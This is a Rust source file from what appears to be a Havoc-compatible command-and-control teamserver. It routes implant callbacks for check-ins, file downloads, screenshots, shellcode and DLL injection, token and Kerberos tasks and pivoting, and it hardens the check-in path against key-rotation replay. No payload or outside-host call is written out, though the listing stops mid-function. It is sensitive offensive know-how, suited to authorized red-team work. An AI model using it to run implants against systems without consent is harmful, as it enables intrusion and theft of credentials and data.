//! Command routing for parsed Demon callback packages.

use std::collections::BTreeMap;
use std::collections::HashMap;
use std::future::Future;
use std::pin::Pin;
use std::sync::Arc;

use base64::Engine as _;
use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
use red_cell_common::crypto::{is_weak_aes_iv, is_weak_aes_key};
use red_cell_common::demon::{
    DemonCallback, DemonCallbackError, DemonCommand, DemonConfigKey, DemonFilesystemCommand,
    DemonInfoClass, DemonInjectError, DemonJobCommand, DemonKerberosCommand, DemonMessage,
    DemonNetCommand, DemonPackage, DemonProcessCommand, DemonProtocolError, DemonSocketCommand,
    DemonSocketType, DemonTokenCommand, DemonTransferCommand,
};
use red_cell_common::operator::{
    AgentResponseInfo, EventCode, Message, MessageHead, OperatorMessage,
};
use serde_json::{Value, json};
use thiserror::Error;
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use tokio::sync::RwLock;
use tracing::warn;
use zeroize::Zeroizing;

use crate::{
    AgentRegistry, AuditResultStatus, Database, DemonCallbackPackage, DemonPacketParser, EventBus,
    LootRecord, PluginRuntime, SocketRelayManager, TeamserverError,
    agent_events::{agent_mark_event, agent_new_event},
    audit_details, parameter_object, record_operator_action,
};

type HandlerFuture =
    Pin<Box<dyn Future<Output = Result<Option<Vec<u8>>, CommandDispatchError>> + Send>>;
type Handler = dyn Fn(u32, u32, Vec<u8>) -> HandlerFuture + Send + Sync + 'static;

use crate::DEFAULT_MAX_DOWNLOAD_BYTES;
const DOWNLOAD_TRACKER_AGGREGATE_CAP_MULTIPLIER: usize = 4;
const DOTNET_INFO_PATCHED: u32 = 0x1;
const DOTNET_INFO_NET_VERSION: u32 = 0x2;
const DOTNET_INFO_ENTRYPOINT_EXECUTED: u32 = 0x3;
const DOTNET_INFO_FINISHED: u32 = 0x4;
const DOTNET_INFO_FAILED: u32 = 0x5;

#[derive(Clone, Debug)]
pub(crate) struct DownloadTracker {
    max_download_bytes: usize,
    max_total_download_bytes: usize,
    inner: Arc<RwLock<DownloadTrackerState>>,
}

#[derive(Debug, Default)]
struct DownloadTrackerState {
    downloads: HashMap<(u32, u32), TrackedDownload>,
    total_buffered_bytes: usize,
}

#[derive(Clone, Debug)]
struct TrackedDownload {
    state: DownloadState,
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct DownloadState {
    request_id: u32,
    remote_path: String,
    expected_size: u64,
    data: Vec<u8>,
    started_at: String,
}

#[derive(Clone, Debug, Default, PartialEq, Eq)]
struct LootContext {
    operator: String,
    command_line: String,
    task_id: String,
    queued_at: String,
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct CredentialCapture {
    label: String,
    content: String,
    pattern: &'static str,
}

#[derive(Clone, Debug)]
struct AgentResponseEntry {
    agent_id: u32,
    command_id: u32,
    request_id: u32,
    kind: String,
    message: String,
    extra: BTreeMap<String, Value>,
    output: String,
}

#[derive(Clone, Copy)]
struct BuiltinDispatchContext<'a> {
    registry: &'a AgentRegistry,
    events: &'a EventBus,
    database: &'a Database,
    sockets: &'a SocketRelayManager,
    downloads: &'a DownloadTracker,
    plugins: Option<&'a PluginRuntime>,
}

#[derive(Clone)]
struct BuiltinHandlerDependencies {
    registry: AgentRegistry,
    events: EventBus,
    database: Database,
    sockets: SocketRelayManager,
    downloads: DownloadTracker,
    plugins: Option<PluginRuntime>,
}

/// Error returned while routing or executing a Demon command handler.
#[derive(Debug, Error)]
pub enum CommandDispatchError {
    /// The dispatcher could not update shared teamserver state.
    #[error("{0}")]
    Registry(#[from] TeamserverError),
    /// A handler failed to serialize its response in Havoc's package format.
    #[error("failed to serialize demon response: {0}")]
    Protocol(#[from] DemonProtocolError),
    /// The dispatcher could not format a callback timestamp.
    #[error("failed to format callback timestamp: {0}")]
    Timestamp(#[from] time::error::Format),
    /// A callback payload could not be parsed according to the Havoc wire format.
    #[error("failed to parse callback payload for command 0x{command_id:08X}: {message}")]
    InvalidCallbackPayload {
        /// Raw command identifier associated with the callback.
        command_id: u32,
        /// Human-readable parser error.
        message: String,
    },
    /// A download exceeded the configured in-memory accumulation cap and was dropped.
    #[error(
        "download 0x{file_id:08X} for agent 0x{agent_id:08X} exceeded max_download_bytes ({max_download_bytes} bytes)"
    )]
    DownloadTooLarge {
        /// Agent owning the dropped download.
        agent_id: u32,
        /// File identifier associated with the dropped download.
        file_id: u32,
        /// Configured maximum number of bytes allowed in memory for a single download.
        max_download_bytes: usize,
    },
    /// Active partial downloads exceeded the configured aggregate in-memory cap and one was dropped.
    #[error(
        "active downloads for agent 0x{agent_id:08X} exceeded aggregate max_download_bytes ({max_total_download_bytes} bytes) while tracking file 0x{file_id:08X}"
    )]
    DownloadAggregateTooLarge {
        /// Agent owning the dropped download.
        agent_id: u32,
        /// File identifier associated with the dropped download.
        file_id: u32,
        /// Configured maximum number of bytes allowed in memory across all active downloads.
        max_total_download_bytes: usize,
    },
}

/// Central registry of Demon command handlers keyed by command identifier.
#[derive(Clone)]
pub struct CommandDispatcher {
    handlers: Arc<HashMap<u32, Arc<Handler>>>,
    downloads: DownloadTracker,
}

impl std::fmt::Debug for CommandDispatcher {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let mut commands = self.handlers.keys().copied().collect::<Vec<_>>();
        commands.sort_unstable();
        formatter.debug_struct("CommandDispatcher").field("registered_commands", &commands).finish()
    }
}

impl Default for CommandDispatcher {
    fn default() -> Self {
        Self::new()
    }
}

impl CommandDispatcher {
    /// Create an empty dispatcher with no registered handlers.
    #[must_use]
    pub fn new() -> Self {
        Self {
            handlers: Arc::new(HashMap::new()),
            downloads: DownloadTracker::from_max_download_bytes(DEFAULT_MAX_DOWNLOAD_BYTES),
        }
    }

    #[must_use]
    fn with_max_download_bytes(max_download_bytes: usize) -> Self {
        Self {
            handlers: Arc::new(HashMap::new()),
            downloads: DownloadTracker::new(max_download_bytes),
        }
    }

    fn register_builtin_handlers(
        &mut self,
        dependencies: BuiltinHandlerDependencies,
        include_get_job: bool,
    ) {
        let BuiltinHandlerDependencies { registry, events, database, sockets, downloads, plugins } =
            dependencies;

        if include_get_job {
            let get_job_registry = registry.clone();
            self.register_handler(u32::from(DemonCommand::CommandGetJob), move |agent_id, _, _| {
                let registry = get_job_registry.clone();
                Box::pin(async move { handle_get_job(&registry, agent_id).await })
            });
        }

        let checkin_registry = registry.clone();
        let checkin_events = events.clone();
        let checkin_database = database.clone();
        let checkin_plugins = plugins.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandCheckin),
            move |agent_id, _, payload| {
                let registry = checkin_registry.clone();
                let events = checkin_events.clone();
                let database = checkin_database.clone();
                let plugins = checkin_plugins.clone();
                Box::pin(async move {
                    handle_checkin(
                        &registry,
                        &events,
                        &database,
                        plugins.as_ref(),
                        agent_id,
                        &payload,
                    )
                    .await
                })
            },
        );

        let proc_list_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandProcList),
            move |agent_id, request_id, payload| {
                let events = proc_list_events.clone();
                Box::pin(async move {
                    handle_process_list_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let sleep_registry = registry.clone();
        let sleep_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandSleep),
            move |agent_id, request_id, payload| {
                let registry = sleep_registry.clone();
                let events = sleep_events.clone();
                Box::pin(async move {
                    handle_sleep_callback(&registry, &events, agent_id, request_id, &payload).await
                })
            },
        );

        let fs_database = database.clone();
        let fs_events = events.clone();
        let fs_downloads = downloads.clone();
        let fs_registry = registry.clone();
        let fs_plugins = plugins.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandFs),
            move |agent_id, request_id, payload| {
                let registry = fs_registry.clone();
                let database = fs_database.clone();
                let events = fs_events.clone();
                let downloads = fs_downloads.clone();
                let plugins = fs_plugins.clone();
                Box::pin(async move {
                    handle_filesystem_callback(
                        &registry,
                        &database,
                        &events,
                        &downloads,
                        plugins.as_ref(),
                        agent_id,
                        request_id,
                        &payload,
                    )
                    .await
                })
            },
        );

        let proc_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandProc),
            move |agent_id, request_id, payload| {
                let events = proc_events.clone();
                Box::pin(async move {
                    handle_process_command_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let proc_ppid_registry = registry.clone();
        let proc_ppid_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandProcPpidSpoof),
            move |agent_id, request_id, payload| {
                let registry = proc_ppid_registry.clone();
                let events = proc_ppid_events.clone();
                Box::pin(async move {
                    handle_proc_ppid_spoof_callback(
                        &registry, &events, agent_id, request_id, &payload,
                    )
                    .await
                })
            },
        );

        let inject_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandInjectShellcode),
            move |agent_id, request_id, payload| {
                let events = inject_events.clone();
                Box::pin(async move {
                    handle_inject_shellcode_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let inject_dll_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandInjectDll),
            move |agent_id, request_id, payload| {
                let events = inject_dll_events.clone();
                Box::pin(async move {
                    handle_inject_dll_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let spawn_dll_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandSpawnDll),
            move |agent_id, request_id, payload| {
                let events = spawn_dll_events.clone();
                Box::pin(async move {
                    handle_spawn_dll_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let command_output_events = events.clone();
        let command_output_plugins = plugins.clone();
        let command_output_database = database.clone();
        let command_output_registry = registry.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandOutput),
            move |agent_id, request_id, payload| {
                let registry = command_output_registry.clone();
                let database = command_output_database.clone();
                let events = command_output_events.clone();
                let plugins = command_output_plugins.clone();
                Box::pin(async move {
                    handle_command_output_callback(
                        &registry,
                        &database,
                        &events,
                        plugins.as_ref(),
                        agent_id,
                        request_id,
                        &payload,
                    )
                    .await
                })
            },
        );

        let error_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandError),
            move |agent_id, request_id, payload| {
                let events = error_events.clone();
                Box::pin(async move {
                    handle_command_error_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let exit_registry = registry.clone();
        let exit_sockets = sockets.clone();
        let exit_events = events.clone();
        let exit_plugins = plugins.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandExit),
            move |agent_id, request_id, payload| {
                let registry = exit_registry.clone();
                let sockets = exit_sockets.clone();
                let events = exit_events.clone();
                let plugins = exit_plugins.clone();
                Box::pin(async move {
                    handle_exit_callback(
                        &registry,
                        &sockets,
                        &events,
                        plugins.as_ref(),
                        agent_id,
                        request_id,
                        &payload,
                    )
                    .await
                })
            },
        );

        let kill_date_registry = registry.clone();
        let kill_date_sockets = sockets.clone();
        let kill_date_events = events.clone();
        let kill_date_plugins = plugins.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandKillDate),
            move |agent_id, request_id, payload| {
                let registry = kill_date_registry.clone();
                let sockets = kill_date_sockets.clone();
                let events = kill_date_events.clone();
                let plugins = kill_date_plugins.clone();
                Box::pin(async move {
                    handle_kill_date_callback(
                        &registry,
                        &sockets,
                        &events,
                        plugins.as_ref(),
                        agent_id,
                        request_id,
                        &payload,
                    )
                    .await
                })
            },
        );

        let info_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::DemonInfo),
            move |agent_id, request_id, payload| {
                let events = info_events.clone();
                Box::pin(async move {
                    handle_demon_info_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let beacon_database = database.clone();
        let beacon_events = events.clone();
        let beacon_downloads = downloads.clone();
        let beacon_registry = registry.clone();
        let beacon_plugins = plugins.clone();
        self.register_handler(
            u32::from(DemonCommand::BeaconOutput),
            move |agent_id, request_id, payload| {
                let registry = beacon_registry.clone();
                let database = beacon_database.clone();
                let events = beacon_events.clone();
                let downloads = beacon_downloads.clone();
                let plugins = beacon_plugins.clone();
                Box::pin(async move {
                    handle_beacon_output_callback(
                        &registry,
                        &database,
                        &events,
                        &downloads,
                        plugins.as_ref(),
                        agent_id,
                        request_id,
                        &payload,
                    )
                    .await
                })
            },
        );

        let token_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandToken),
            move |agent_id, request_id, payload| {
                let events = token_events.clone();
                Box::pin(async move {
                    handle_token_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let assembly_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandAssemblyInlineExecute),
            move |agent_id, request_id, payload| {
                let events = assembly_events.clone();
                Box::pin(async move {
                    handle_assembly_inline_execute_callback(&events, agent_id, request_id, &payload)
                        .await
                })
            },
        );

        let assembly_versions_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandAssemblyListVersions),
            move |agent_id, request_id, payload| {
                let events = assembly_versions_events.clone();
                Box::pin(async move {
                    handle_assembly_list_versions_callback(&events, agent_id, request_id, &payload)
                        .await
                })
            },
        );

        let job_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandJob),
            move |agent_id, request_id, payload| {
                let events = job_events.clone();
                Box::pin(async move {
                    handle_job_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let net_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandNet),
            move |agent_id, request_id, payload| {
                let events = net_events.clone();
                Box::pin(async move {
                    handle_net_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let config_registry = registry.clone();
        let config_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandConfig),
            move |agent_id, request_id, payload| {
                let registry = config_registry.clone();
                let events = config_events.clone();
                Box::pin(async move {
                    handle_config_callback(&registry, &events, agent_id, request_id, &payload).await
                })
            },
        );

        let screenshot_database = database.clone();
        let screenshot_events = events.clone();
        let screenshot_registry = registry.clone();
        let screenshot_plugins = plugins.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandScreenshot),
            move |agent_id, request_id, payload| {
                let registry = screenshot_registry.clone();
                let database = screenshot_database.clone();
                let events = screenshot_events.clone();
                let plugins = screenshot_plugins.clone();
                Box::pin(async move {
                    handle_screenshot_callback(
                        &registry,
                        &database,
                        &events,
                        plugins.as_ref(),
                        agent_id,
                        request_id,
                        &payload,
                    )
                    .await
                })
            },
        );

        let transfer_events = events.clone();
        let transfer_downloads = downloads.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandTransfer),
            move |agent_id, request_id, payload| {
                let events = transfer_events.clone();
                let downloads = transfer_downloads.clone();
                Box::pin(async move {
                    handle_transfer_callback(&events, &downloads, agent_id, request_id, &payload)
                        .await
                })
            },
        );

        let kerberos_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandKerberos),
            move |agent_id, request_id, payload| {
                let events = kerberos_events.clone();
                Box::pin(async move {
                    handle_kerberos_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let mem_file_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandMemFile),
            move |agent_id, request_id, payload| {
                let events = mem_file_events.clone();
                Box::pin(async move {
                    handle_mem_file_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let package_dropped_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandPackageDropped),
            move |agent_id, request_id, payload| {
                let events = package_dropped_events.clone();
                Box::pin(async move {
                    handle_package_dropped_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let socket_events = events.clone();
        let socket_manager = sockets.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandSocket),
            move |agent_id, request_id, payload| {
                let events = socket_events.clone();
                let sockets = socket_manager.clone();
                Box::pin(async move {
                    handle_socket_callback(&events, &sockets, agent_id, request_id, &payload).await
                })
            },
        );

        let pivot_registry = registry.clone();
        let pivot_events = events.clone();
        let pivot_database = database.clone();
        let pivot_sockets = sockets.clone();
        let pivot_downloads = downloads.clone();
        let pivot_plugins = plugins.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandPivot),
            move |agent_id, request_id, payload| {
                let registry = pivot_registry.clone();
                let events = pivot_events.clone();
                let database = pivot_database.clone();
                let sockets = pivot_sockets.clone();
                let downloads = pivot_downloads.clone();
                let plugins = pivot_plugins.clone();
                Box::pin(async move {
                    let context = BuiltinDispatchContext {
                        registry: &registry,
                        events: &events,
                        database: &database,
                        sockets: &sockets,
                        downloads: &downloads,
                        plugins: plugins.as_ref(),
                    };
                    handle_pivot_callback(context, agent_id, request_id, &payload).await
                })
            },
        );
    }

    /// Create a dispatcher with the built-in Demon command handlers.
    #[must_use]
    pub fn with_builtin_handlers(
        registry: AgentRegistry,
        events: EventBus,
        database: Database,
        sockets: SocketRelayManager,
        plugins: Option<PluginRuntime>,
    ) -> Self {
        Self::with_builtin_handlers_and_max_download_bytes(
            registry,
            events,
            database,
            sockets,
            plugins,
            DEFAULT_MAX_DOWNLOAD_BYTES,
        )
    }

    /// Create a dispatcher with the built-in Demon command handlers and a custom download cap.
    #[must_use]
    pub fn with_builtin_handlers_and_max_download_bytes(
        registry: AgentRegistry,
        events: EventBus,
        database: Database,
        sockets: SocketRelayManager,
        plugins: Option<PluginRuntime>,
        max_download_bytes: u64,
    ) -> Self {
        Self::with_builtin_handlers_and_downloads(
            registry,
            events,
            database,
            sockets,
            plugins,
            DownloadTracker::from_max_download_bytes(max_download_bytes),
        )
    }

    pub(crate) fn with_builtin_handlers_and_downloads(
        registry: AgentRegistry,
        events: EventBus,
        database: Database,
        sockets: SocketRelayManager,
        plugins: Option<PluginRuntime>,
        downloads: DownloadTracker,
    ) -> Self {
        let mut dispatcher = Self::with_downloads(downloads);
        dispatcher.register_builtin_handlers(
            BuiltinHandlerDependencies {
                registry,
                events,
                database,
                sockets,
                downloads: dispatcher.downloads.clone(),
                plugins,
            },
            true,
        );

        dispatcher
    }

    fn with_downloads(downloads: DownloadTracker) -> Self {
        Self { handlers: Arc::new(HashMap::new()), downloads }
    }

    /// Register or replace a handler for a raw Demon command identifier.
    pub fn register_handler<F>(&mut self, command_id: u32, handler: F)
    where
        F: Fn(u32, u32, Vec<u8>) -> HandlerFuture + Send + Sync + 'static,
    {
        Arc::make_mut(&mut self.handlers).insert(command_id, Arc::new(handler));
    }

    /// Return `true` when a handler is registered for `command_id`.
    #[must_use]
    pub fn handles_command(&self, command_id: u32) -> bool {
        self.handlers.contains_key(&command_id)
    }

    /// Dispatch a single parsed callback package.
    pub async fn dispatch(
        &self,
        agent_id: u32,
        command_id: u32,
        request_id: u32,
        payload: &[u8],
    ) -> Result<Option<Vec<u8>>, CommandDispatchError> {
        let Some(handler) = self.handlers.get(&command_id).cloned() else {
            return Ok(None);
        };

        handler(agent_id, request_id, payload.to_vec()).await
    }

    /// Dispatch multiple parsed callback packages and concatenate any response packages.
    pub async fn dispatch_packages(
        &self,
        agent_id: u32,
        packages: &[DemonCallbackPackage],
    ) -> Result<Vec<u8>, CommandDispatchError> {
        self.collect_response_bytes(agent_id, packages).await
    }

    async fn collect_response_bytes(
        &self,
        agent_id: u32,
        packages: &[DemonCallbackPackage],
    ) -> Result<Vec<u8>, CommandDispatchError> {
        let mut response = Vec::new();

        for package in packages {
            if let Some(bytes) = self
                .dispatch(agent_id, package.command_id, package.request_id, &package.payload)
                .await?
            {
                response.extend_from_slice(&bytes);
            }
        }

        Ok(response)
    }
}

async fn handle_get_job(
    registry: &AgentRegistry,
    agent_id: u32,
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let jobs = registry.dequeue_jobs(agent_id).await?;
    if jobs.is_empty() {
        return Ok(None);
    }

    let mut packages = Vec::with_capacity(jobs.len());

    for job in jobs {
        let payload = if job.payload.is_empty() {
            Vec::new()
        } else {
            registry.encrypt_for_agent(agent_id, &job.payload).await?
        };
        packages.push(DemonPackage {
            command_id: job.command,
            request_id: job.request_id,
            payload,
        });
    }

    Ok(Some(DemonMessage::new(packages).to_bytes()?))
}

async fn handle_checkin(
    registry: &AgentRegistry,
    events: &EventBus,
    database: &Database,
    plugins: Option<&PluginRuntime>,
    agent_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let timestamp = OffsetDateTime::now_utc().format(&Rfc3339)?;
    let existing =
        registry.get(agent_id).await.ok_or(TeamserverError::AgentNotFound { agent_id })?;
    let agent = if let Some(mut updated) =
        parse_checkin_metadata(existing.clone(), agent_id, payload, &timestamp)?
    {
        let key_rotation = updated.encryption != existing.encryption;

        if key_rotation {
            // SECURITY: The Demon binary protocol includes no nonce, timestamp, or
            // challenge-response in the COMMAND_CHECKIN payload, so the teamserver cannot
            // distinguish a fresh rotation from a replayed packet carrying a known key.  An
            // adversary who captures a CHECKIN frame can replay it to push the session key to a
            // value they control and then decrypt subsequent traffic or inject spoofed commands.
            //
            // To close the replay window entirely, key rotation is refused for all agents
            // regardless of whether they are direct or pivot-relayed.  Agents that genuinely need
            // new key material must go through a full DEMON_INIT re-registration, which is
            // protected by the mutual-auth handshake.
            let pivot_parent = registry.parent_of(agent_id).await.map(|p| format!("{p:08X}"));
            warn!(
                agent_id = format_args!("{agent_id:08X}"),
                pivot_parent,
                "refused AES session key rotation from CHECKIN payload — \
                 no replay/freshness guarantee in the Demon protocol; \
                 re-init required for legitimate key rotation"
            );
            updated.encryption = existing.encryption.clone();
        }

        registry.update_agent(updated).await?;
        registry.get(agent_id).await.ok_or(TeamserverError::AgentNotFound { agent_id })?
    } else {
        registry.set_last_call_in(agent_id, timestamp).await?
    };
    events.broadcast(agent_mark_event(&agent));
    if let Err(error) = record_operator_action(
        database,
        "teamserver",
        "agent.checkin",
        "agent",
        Some(format!("{agent_id:08X}")),
        audit_details(
            AuditResultStatus::Success,
            Some(agent_id),
            Some("checkin"),
            Some(parameter_object([(
                "external_ip",
                serde_json::Value::String(agent.external_ip.clone()),
            )])),
        ),
    )
    .await
    {
        warn!(agent_id = format_args!("{agent_id:08X}"), %error, "failed to persist agent.checkin audit entry");
    }
    if let Some(plugins) = plugins
        && let Err(error) = plugins.emit_agent_checkin(agent_id).await
    {
        warn!(agent_id = format_args!("{agent_id:08X}"), %error, "failed to emit python agent_checkin event");
    }
    Ok(None)
}

fn parse_checkin_metadata(
    existing: red_cell_common::AgentRecord,
    agent_id: u32,
    payload: &[u8],
    timestamp: &str,
) -> Result<Option<red_cell_common::AgentRecord>, CommandDispatchError> {
    const CHECKIN_METADATA_PREFIX_LEN: usize = 32 + 16;

    if payload.is_empty() {
        return Ok(None);
    }
    if payload.len() < CHECKIN_METADATA_PREFIX_LEN {
        return Err(CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandCheckin),
            message: format!(
                "truncated CHECKIN payload: {} byte(s) is too short for the \
                 {CHECKIN_METADATA_PREFIX_LEN}-byte metadata prefix",
                payload.len()
            ),
        });
    }

    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandCheckin));
    let aes_key = parser.read_fixed_bytes(32, "checkin AES key")?;
    let aes_iv = parser.read_fixed_bytes(16, "checkin AES IV")?;
    let parsed_agent_id = parser.read_u32("checkin agent id")?;

    validate_checkin_transport_material(agent_id, &aes_key, &aes_iv)?;

    if parsed_agent_id != agent_id {
        return Err(CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandCheckin),
            message: format!(
                "checkin agent id mismatch: expected 0x{agent_id:08X}, got 0x{parsed_agent_id:08X}"
            ),
        });
    }

    let hostname = parser.read_string("checkin hostname")?;
    let username = parser.read_string("checkin username")?;
    let domain_name = parser.read_string("checkin domain name")?;
    let internal_ip = parser.read_string("checkin internal ip")?;
    let process_path = parser.read_utf16("checkin process path")?;
    let process_pid = parser.read_u32("checkin process pid")?;
    let process_tid = parser.read_u32("checkin process tid")?;
    let process_ppid = parser.read_u32("checkin process ppid")?;
    let process_arch = parser.read_u32("checkin process arch")?;
    let elevated = parser.read_bool("checkin elevated")?;
    let base_address = parser.read_u64("checkin base address")?;
    let os_major = parser.read_u32("checkin os major")?;
    let os_minor = parser.read_u32("checkin os minor")?;
    let os_product_type = parser.read_u32("checkin os product type")?;
    let os_service_pack = parser.read_u32("checkin os service pack")?;
    let os_build = parser.read_u32("checkin os build")?;
    let os_arch = parser.read_u32("checkin os arch")?;
    let sleep_delay = parser.read_u32("checkin sleep delay")?;
    let sleep_jitter = parser.read_u32("checkin sleep jitter")?;
    let kill_date = parser.read_u64("checkin kill date")?;
    let working_hours = parser.read_u32("checkin working hours")?;

    let mut updated = existing;
    updated.active = true;
    updated.reason.clear();
    updated.encryption.aes_key = Zeroizing::new(aes_key);
    updated.encryption.aes_iv = Zeroizing::new(aes_iv);
    updated.hostname = hostname;
    updated.username = username;
    updated.domain_name = domain_name;
    updated.internal_ip = internal_ip;
    updated.process_name = basename(&process_path);
    updated.process_path = process_path;
    updated.base_address = base_address;
    updated.process_pid = process_pid;
    updated.process_tid = process_tid;
    updated.process_ppid = process_ppid;
    updated.process_arch = checkin_process_arch_label(process_arch).to_owned();
    updated.elevated = elevated;
    updated.os_version = checkin_windows_version_label(
        os_major,
        os_minor,
        os_product_type,
        os_service_pack,
        os_build,
    );
    updated.os_build = os_build;
    updated.os_arch = checkin_windows_arch_label(os_arch).to_owned();
    updated.sleep_delay = sleep_delay;
    updated.sleep_jitter = sleep_jitter;
    updated.kill_date = parse_optional_kill_date(
        kill_date,
        u32::from(DemonCommand::CommandCheckin),
        "checkin kill date",
    )?;
    updated.working_hours = decode_working_hours(working_hours);
    updated.last_call_in = timestamp.to_owned();

    Ok(Some(updated))
}

fn validate_checkin_transport_material(
    agent_id: u32,
    aes_key: &[u8],
    aes_iv: &[u8],
) -> Result<(), CommandDispatchError> {
    if is_weak_aes_key(aes_key) {
        warn!(
            agent_id = format_args!("0x{agent_id:08X}"),
            "rejecting COMMAND_CHECKIN with all-zero AES key"
        );
        return Err(CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandCheckin),
            message: "all-zero AES key is not allowed".to_owned(),
        });
    }

    if is_weak_aes_iv(aes_iv) {
        warn!(
            agent_id = format_args!("0x{agent_id:08X}"),
            "rejecting COMMAND_CHECKIN with all-zero AES IV"
        );
        return Err(CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandCheckin),
            message: "all-zero AES IV is not allowed".to_owned(),
        });
    }

    Ok(())
}

fn decode_working_hours(raw: u32) -> Option<i32> {
    // Preserve the 32-bit protocol bitmask exactly, including the high bit.
    (raw != 0).then_some(i32::from_be_bytes(raw.to_be_bytes()))
}

fn parse_optional_kill_date(
    raw: u64,
    command_id: u32,
    field: &'static str,
) -> Result<Option<i64>, CommandDispatchError> {
    if raw == 0 {
        return Ok(None);
    }

    let parsed = i64::try_from(raw).map_err(|_| CommandDispatchError::InvalidCallbackPayload {
        command_id,
        message: format!("{field} exceeds i64 range"),
    })?;
    Ok(Some(parsed))
}

fn basename(path: &str) -> String {
    path.rsplit(['\\', '/']).next().unwrap_or(path).to_owned()
}

fn checkin_process_arch_label(value: u32) -> &'static str {
    match value {
        2 => "x64",
        1 => "x86",
        3 => "IA64",
        _ => "Unknown",
    }
}

fn checkin_windows_arch_label(value: u32) -> &'static str {
    match value {
        0 => "x86",
        9 => "x64/AMD64",
        5 => "ARM",
        12 => "ARM64",
        6 => "Itanium-based",
        _ => "Unknown",
    }
}

fn checkin_windows_version_label(
    major: u32,
    minor: u32,
    product_type: u32,
    service_pack: u32,
    build: u32,
) -> String {
    const VER_NT_WORKSTATION: u32 = 1;

    let mut version =
        if major == 10 && minor == 0 && product_type != VER_NT_WORKSTATION && build == 20_348 {
            "Windows 2022 Server 22H2".to_owned()
        } else if major == 10 && minor == 0 && product_type != VER_NT_WORKSTATION && build == 17_763
        {
            "Windows 2019 Server".to_owned()
        } else if major == 10
            && minor == 0
            && product_type == VER_NT_WORKSTATION
            && (22_000..=22_621).contains(&build)
        {
            "Windows 11".to_owned()
        } else if major == 10 && minor == 0 && product_type != VER_NT_WORKSTATION {
            "Windows 2016 Server".to_owned()
        } else if major == 10 && minor == 0 && product_type == VER_NT_WORKSTATION {
            "Windows 10".to_owned()
        } else if major == 6 && minor == 3 && product_type != VER_NT_WORKSTATION {
            "Windows Server 2012 R2".to_owned()
        } else if major == 6 && minor == 3 && product_type == VER_NT_WORKSTATION {
            "Windows 8.1".to_owned()
        } else if major == 6 && minor == 2 && product_type != VER_NT_WORKSTATION {
            "Windows Server 2012".to_owned()
        } else if major == 6 && minor == 2 && product_type == VER_NT_WORKSTATION {
            "Windows 8".to_owned()
        } else if major == 6 && minor == 1 && product_type != VER_NT_WORKSTATION {
            "Windows Server 2008 R2".to_owned()
        } else if major == 6 && minor == 1 && product_type == VER_NT_WORKSTATION {
            "Windows 7".to_owned()
        } else {
            "Unknown".to_owned()
        };

    if service_pack != 0 {
        version.push_str(" Service Pack ");
        version.push_str(&service_pack.to_string());
    }

    version
}

async fn handle_pivot_callback(
    context: BuiltinDispatchContext<'_>,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandPivot));
    let subcommand = parser.read_u32("pivot subcommand")?;

    match subcommand.try_into() {
        Ok(red_cell_common::demon::DemonPivotCommand::SmbConnect) => {
            handle_pivot_connect_callback(
                context.registry,
                context.events,
                agent_id,
                request_id,
                &mut parser,
            )
            .await
        }
        Ok(red_cell_common::demon::DemonPivotCommand::SmbDisconnect) => {
            handle_pivot_disconnect_callback(
                context.registry,
                context.events,
                agent_id,
                request_id,
                &mut parser,
            )
            .await
        }
        Ok(red_cell_common::demon::DemonPivotCommand::SmbCommand) => {
            handle_pivot_command_callback(context, agent_id, &mut parser).await
        }
